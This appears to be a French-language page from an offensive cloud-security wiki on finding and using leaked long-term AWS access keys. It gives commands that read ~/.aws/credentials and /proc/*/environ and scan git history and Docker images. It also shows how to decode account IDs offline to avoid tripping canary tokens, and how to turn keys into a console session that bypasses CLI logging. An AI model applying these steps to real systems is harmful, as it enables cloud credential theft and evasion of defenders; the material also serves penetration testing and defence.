---
order: 1
title: "Clés d'accès : paires AKIA à long terme dans les fichiers, l'environnement et le code source"
description: "Trouver et utiliser les paires de clés d'accès AWS à long terme laissées dans les fichiers, les variables d'environnement, la configuration CI et le code source, y compris l'historique git et les couches Docker."
keywords:
  - clés d'accès
  - AKIA
  - fichier de credentials
  - variables d'environnement
  - historique git
---

# Clés d'accès

Une clé d'accès à long terme est un identifiant préfixé par `AKIA` et son secret. Contrairement aux credentials de rôle, elles n'expirent pas, donc une clé trouvée une fois continue de fonctionner jusqu'à sa rotation ou sa désactivation. Elles fuitent en permanence dans les fichiers, les variables d'environnement, la configuration CI et le code source commité, ce qui fait du grep à leur recherche l'un des gestes les plus rentables sur n'importe quel point d'ancrage.

## Où elles se trouvent sur un hôte

```bash
cat ~/.aws/credentials ~/.aws/config 2>/dev/null
env | grep -i AWS_                       # AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep AWS_
```

## Dans le code source et l'historique

```bash
# live tree and full git history
trufflehog filesystem . ; trufflehog git file://. 
gitleaks detect --source . -v
# Docker images bake keys into layers
trufflehog docker --image <image:tag>
```

## Utiliser et trier une clé

```bash
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity          # whose key is it, which account
```

## Préfixes et identification hors ligne

Un préfixe `AKIA` est une clé à long terme ; un préfixe `ASIA` est temporaire et nécessite aussi le jeton de session (voir [jetons STS](sts-tokens.md)). L'identifiant de compte à 12 chiffres est encodé dans l'identifiant de la clé lui-même, il peut donc être retrouvé sans appeler AWS :

```python
import base64
def akid_to_account(akid):                 # AKIA.../ASIA... -> account id
    raw = base64.b32decode(akid[4:].upper())[:6]
    n = int.from_bytes(raw, "big")
    return (n & 0x7fffffffff80) >> 7
```

L'étape hors ligne compte pour repérer un **canary** : les clés de canary-token de Thinkst et d'AWS vivent dans des identifiants de compte connus, et un seul `sts:GetCallerIdentity` contre l'une d'elles déclenche l'alerte du défenseur. Identifiez d'abord le compte, et ne touchez à AWS qu'une fois la clé jugée réelle.

## Vers la console

Des credentials CLI se convertissent en une session navigateur, qui subsiste sous forme d'onglet de console connecté et contourne la journalisation spécifique à la CLI :

```bash
aws_consoler -a AKIA... -s <secret>        # prints a federated console sign-in URL
```

## Notes d'exploitation

- Un préfixe `ASIA` est une clé temporaire et nécessite aussi `AWS_SESSION_TOKEN` ; voir [jetons STS](sts-tokens.md).
- Les clés présentes dans l'historique git survivent à un commit de suppression ultérieur, analysez donc toujours l'historique complet, pas seulement le checkout.
- Une fois validée, déterminez les droits du principal avec l'[énumération d'identité](../identity/enumeration.md) avant d'agir.

## Outils

- **TruffleHog** / **Gitleaks** : analyse de secrets sur le système de fichiers, git et les images.
- **AWS CLI** (`sts get-caller-identity`) : valider et attribuer une clé.
- **aws_consoler** (NetSPI) : transformer des credentials CLI en URL de connexion à la console.

## Références

- [TruffleHog (Truffle Security)](https://github.com/trufflesecurity/trufflehog)
- [aws_consoler (NetSPI)](https://github.com/NetSPI/aws_consoler)
- [The structure of an AWS access key ID (Tal Be'ery)](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)
- [HackTricks Cloud: AWS access keys](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
